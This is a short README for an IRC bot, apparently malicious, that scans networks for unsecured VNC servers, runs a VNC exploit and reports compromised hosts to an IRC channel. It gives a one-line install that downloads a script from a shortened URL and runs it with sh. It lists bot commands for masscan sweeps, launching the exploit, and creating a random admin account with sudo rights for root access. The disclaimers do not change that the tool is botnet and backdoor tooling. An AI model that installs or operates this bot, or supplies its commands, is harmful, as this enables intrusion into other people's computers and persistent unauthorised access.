# I am not responsible for any actions you make with this program.
# You will not use this program to commit illegal crimes.
# You take entire responsability if you damage your or someone else's computer.

This code is an IRC BOT that can connect to an IRC server with SSL
The main purpose of this bot is to scan for Open/Unsecured VNC servers.

# ---INSTALLATION---

wget https://is.gd/perlvncbot && sh perlvncbot

# ----COMMANDS----
# NOTE:The commands can be done via PRIVATE MESSAGE and CHANNEL also.
# ----------------
# NEW COMMAND: @.getssh <= This will make a random admin account/password with sudo powers (use: sudo su :to get root access)
# ----------------
# Using this command will start masscan on your Local Area Network, or the LAN which the bot is installed on.
@.scan 192.168.0.0-192.168.255.255 
# This needs to be done before each @.exploit
@.format 
# This runs the VNC exploit and reports the working VNCs to the channel
@.exploit 
# This kills the exploit run
@.stopexploit 

